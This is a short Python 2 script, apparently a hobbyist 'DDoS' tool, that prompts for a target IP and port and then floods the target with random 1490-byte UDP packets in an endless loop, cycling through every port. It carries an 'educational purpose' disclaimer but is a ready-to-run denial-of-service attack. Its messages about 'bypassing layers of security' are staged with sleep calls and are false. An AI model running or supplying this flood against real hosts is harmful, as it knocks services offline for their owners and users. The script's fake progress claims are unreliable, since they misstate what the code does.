print ("\033[92m")
import sys
import os
import time
import socket
import random

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("figlet HACKERKIDXO Ddos")
print
print "Coded By : HACKER KID"
print "Author   : HACKERKIDXO"
print "Instgram ID : @Hackerkidxo"
print "Youtube : @Hackerkidxo"
print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We aren't responsible for your actions"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")
os.system("clear")
os.system("figlet HACKERKIDXO Ddos")
print("Team : HACKER KID")
print ("\033[92m")
print "--Reaching Server--"
time.sleep(3)
print "--**Reached Server Successfully**--"
time.sleep(5)
print "--Establishing Connection--"
time.sleep(3)
print "--**For Establishing Connection Need To Bypass**-- Note: Its Bypass Automatically"
time.sleep(5)
print "--Bypassing layers of Security--"
time.sleep(5)
print "--**Bypassed Succesfully**--"
time.sleep(5)
print "--Connection Established--"
time.sleep(5)
print "***** DDos Started ***** Note :Only For Education Purpose Only"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
